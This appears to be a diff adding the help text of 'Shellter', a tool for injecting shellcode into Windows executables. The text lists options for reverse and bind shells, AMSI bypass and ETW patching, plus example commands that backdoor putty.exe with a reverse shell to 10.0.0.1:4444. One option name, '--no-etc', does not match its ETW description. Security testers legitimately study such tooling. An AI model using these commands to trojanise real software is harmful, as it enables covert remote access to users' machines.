@@ -1,0 +1,31 @@
+Shellter - Dynamic Shellcode Injection Tool
+
+Usage: shellter [options]
+
+Backdoor Windows PE files with shellcode while preserving functionality.
+
+Options:
+  --pe=FILE              Target PE file path
+  --shellcode=FILE       Custom shellcode file
+  --reverse-ip=ADDR      Reverse shell listener IP
+  --reverse-port=PORT    Reverse shell listener port
+  --bind-port=PORT       Bind shell port
+  --bind-ip=ADDR         Bind shell bind IP
+  -o, --output=FILE      Output file path
+  -m, --mode=MODE        Mode: auto (default) or manual
+  --no-amsi              Disable AMSI bypass
+  --no-etc               Disable ETW patching
+  --quiet                Quiet mode
+  -v, --verbose          Verbose output
+  --debug                Debug mode
+  -h, --help             Show this help message
+
+Operating Modes:
+  Auto mode:   shellter --pe putty.exe --reverse-ip 10.0.0.1 --reverse-port 4444 -m auto
+  Manual mode: shellter --pe putty.exe -m manual
+  Custom:      shellter --pe putty.exe --shellcode shellcode.bin
+
+Example:
+  shellter --pe putty.exe --reverse-ip 10.0.0.1 --reverse-port 4444 -m auto
+  shellter --pe putty.exe -m manual
+  shellter --pe putty.exe --bind-port 4444 --quiet
